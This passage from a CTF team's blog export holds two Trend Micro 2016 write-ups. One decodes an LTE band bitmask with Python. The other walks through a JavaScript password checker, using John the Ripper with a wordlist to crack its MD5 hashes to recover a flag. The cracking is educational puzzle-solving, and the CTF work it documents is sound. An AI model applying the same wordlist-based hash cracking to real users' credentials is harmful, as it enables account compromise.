1’s or 0’s, if it’s 1 it supports the LTE band if not it doesn’t and we don’t need that number to be in our flag. 1234567896828 (0x1AAC) OKFF 1D 1F 03 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 How to convert to little-endian: Grab the hex “FF1D1F03” and reverse from the right, so the little-endian will be “031F1DFF”. The next step will be to convert it to binary 0011 0001 1111 0001 1101 1111 1111, after this you start from the right to the left, the first bit from the right is ‘1’ so our device supports the LTE band 1 and so on, after you do this to the rest of the bits you will see the device supports this LTE frequencies bands: 1,2,3,4,5,6,7,8,9,11,12,13,17,18,19,20,21,25,26 You could always use this program to list the LTE , they will appear on that “bit information” field you can download it here (only works on windows https://mega.nz/#!HBt1CTLS!EZItWos4tvhwMMPokG1ZWN8k6lnzy2oLqWwxRRksq1Y) : Or you can do just like me do a small python script to find the flag :) 1234567891011def to_little_endian(hex): return ''.join(hex.split(' ')[::-1])a = 'FF 1D 1F 03';binary_string = bin(int(to_little_endian(a),16))[2:]l = []number_of_bits = len(binary_string)for x in xrange(0, number_of_bits): if (binary_string[number_of_bits-1 - x] == '1'): l.append(x+1)print 'TMCTF&#123;%s&#125;' % str(l)[1:-1].replace(' ', '') After running it you will get the flag :) 12kinyabitch@Debian ~/h/c/n/2&gt; python ltebands.pyTMCTF&#123;1,2,3,4,5,6,7,8,9,11,12,13,17,18,19,20,21,25,26&#125;","categories":[{"name":"Misc","slug":"Misc","permalink":"https://teamrocketist.github.io/categories/Misc/"}],"tags":[{"name":"LTE","slug":"LTE","permalink":"https://teamrocketist.github.io/tags/LTE/"},{"name":"Misc","slug":"Misc","permalink":"https://teamrocketist.github.io/tags/Misc/"}]},{"title":"Ofensive 100 - CTF Trend Micro Online Qualifier 2016","slug":"Ofensive-100-CTF-Trend-Micro-Online-Qualifier-2016","date":"2016-07-31T10:22:58.000Z","updated":"2018-10-24T23:21:04.822Z","comments":true,"path":"2016/07/31/Ofensive-100-CTF-Trend-Micro-Online-Qualifier-2016/","link":"","permalink":"https://teamrocketist.github.io/2016/07/31/Ofensive-100-CTF-Trend-Micro-Online-Qualifier-2016/","excerpt":"","text":"Find the flag.https://www.mediafire.com/?3x3m94598518054openssl enc -d -aes-256-cbc -k x0nSTZ9NrDgvCnqKhL9y -in files1.enc -out files1.zipunzip files1.zip After unzipping the file I found strange it was a hta file extension which I never heard off, but after analyzing the code it was just some html and javascript. Some of the JavaScript code was minimized so I just used http://jsbeautifier.org/ to make it readable for humans. The first thing you can see in the code are these three interesting hashes: 1234567window.host=FnBJT9OVUieRCjeTgMPMBe4U.hs;var m = window.host;var nl = [0,2,1,12,7,15,5,4,8,16,17,3,9,10,14,11,13,6,0];var ko=\"c33367701511b4f6020ec61ded352059\";var ka=\"61636f697b57b5b7d389db0edb801fc3\";var kq=\"d2172edf24129e06f3913376a12919a4\"; The first one is actually very easy to crack I used john the ripper but you could find it even easier by searching it on google you can immediately find it’s a md5 hash by analysing the FnBJT9OVUieRCjeTgMPMBe4U.hs which is a known js code for md5 encryption. 123456kinyabitch@Debian ~/h/p/j/run&gt; ./john --wordlist=password.lst pass.txt --format=raw-md5Loaded 1 password hash (Raw MD5 [128/128 SSE2 intrinsics 12x])654321 (?)guesses: 1 time: 0:00:00:00 DONE (Sun Jul 31 13:09:53 2016) c/s: 960 trying: 1q2w3e - blazerUse the \"--show\" option to display all of the cracked passwords reliably After cracking it with john you find the hash c33367701511b4f6020ec61ded352059 was actually ‘654321’. 123456789101112131415161718192021222324252627282930313233343536373839404142function checkPW(pass) &#123;if (pass != null &amp;&amp; pass == \"close\") &#123;window.close();&#125;;if (pass == null || pass.length != 24) &#123;alert(\"Wrong password\");return;&#125;;if (pass.substring(0, 6) != \"TMCTF&#123;\" || pass.substr(pass.length - 1) != \"&#125;\") &#123;alert(\"Wrong password\");return;&#125;;var pwbody = (\" \" + pass.substring(6, pass.length - 1)).split(\"\");var h1 = \"\",h2 = \"\",h3 = \"\";for (var i = 0; i &lt; pwbody.length;) &#123;h1 += pwbody[nl[++i]];h2 += pwbody[nl[++i]];h3 += pwbody[nl[++i]];&#125;;if (co(m(h1.replace(/(^\\s+)|(\\s+$)/g, \"\"))) &amp;&amp; ca(m(h3.replace(/(^\\s+)|(\\s+$)/g, \"\"))) &amp;&amp; cq(m(h2.replace(/(^\\s+)|(\\s+$)/g, \"\")))) &#123;alert(\"ok!\");window.close();&#125; else &#123;alert(\"Wrong password\");return;&#125;;&#125;function co(o) &#123;return (o === ko);&#125;function ca(a) &#123;return (a === ka.replace(/6/g, '2').replace(/b/g, 'a').replace(/d/g, '4'));&#125;function cq(q) &#123;return (q === kq.replace(/1/g, '5').replace(/2/g, '8').replace(/3/g, 'b').replace(/9/g, 'c'));&#125; Analyzing this function was the key to this challenge with this code you can find out the flag has 18 characters always having this format “TMCTF{pass}” otherwise will be always wrong. 1234567if (pass.substring(0, 6) != \"TMCTF&#123;\" || pass.substr(pass.length - 1) != \"&#125;\") &#123;alert(\"Wrong password\");return;&#125;;var pwbody = (\" \" + pass.substring(6, pass.length - 1)).split(\"\"); After passing this first length checks you will notice that this for loop is actually mixing from different indexes splited into 3 strings (h1, h2, h3). 123456for (var i = 0; i &lt; pwbody.length;) &#123;h1 += pwbody[nl[++i]];h2 += pwbody[nl[++i]];h3 += pwbody[nl[++i]];&#125;; Then you will see somethig that is a little confusing 3 boolean conditions (co, ca and cq),the first regex expression replaces characters like spaces you will find the function in “m” that is actually the hash function into md5: 12if (co(m(h1.replace(/(^\\s+)|(\\s+$)/g, \"\"))) &amp;&amp; ca(m(h3.replace(/(^\\s+)|(\\s+$)/g, \"\"))) &amp;&amp; cq(m(h2.replace(/(^\\s+)|(\\s+$)/g, \"\")))) &#123;...&#125; And now after looking to this 3 functions you will realize why you couldn’t crack the other two, because some of its characters are being replaced by the right ones making the hash much easier to crack (you can copy the entire js code (browser JS console) and just run the replace code in ka and kq string). 123456789101112function co(o) &#123;return (o === ko);&#125;function ca(a) &#123;return (a === ka.replace(/6/g, '2').replace(/b/g, 'a').replace(/d/g, '4'));&#125;function cq(q) &#123;return (q === kq.replace(/1/g, '5').replace(/2/g, '8').replace(/3/g, 'b').replace(/9/g, 'c'));&#125; 12345678&gt; \"61636f697b57b5b7d389db0edb801fc3\".replace(/6/g, '2').replace(/b/g, 'a').replace(/d/g, '4');21232f297a57a5a743894a0e4a801fc3&gt; \"d2172edf24129e06f3913376a12919a4\".replace(/1/g, '5').replace(/2/g, '8').replace(/3/g, 'b').replace(/9/g, 'c');d8578edf8458ce06fbc5bb76a58c5ca4 A now cracking it on john you find out they ‘qwerty’ and ‘admin’. 123456kinyabitch@Debian ~/h/p/j/run&gt; ./john --wordlist=password.lst pass2.txt --format=raw-md5Loaded 3 password hashes with no different salts (Raw MD5 [128/128 SSE2 intrinsics 12x])Remaining 2 password hashes with no different saltsqwerty (?)admin (?) After finding this 3 hashes you can finally realize you can reconstruct the password basing on that for loop, I wrote a python script to make it easier to change (doing manually would take a lot of time and I could make mistakes): http://pastebin.com/embed_iframe/phYNZi4AAfter running it you will find the flag: 123kinyabitch@Debian ~/h/c/ofensive&gt; python crack.pyTMCTF&#123;q6r4dy5ei2na1twm3&#125;","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"hash","slug":"hash","permalink":"https://teamrocketist.github.io/tags/hash/"},{"name":"bruteforce","slug":"bruteforce","permalink":"https://teamrocketist.github.io/tags/bruteforce/"},{"name":"md5","slug":"md5","permalink":"https://teamrocketist.github.io/tags/md5/"}]}]}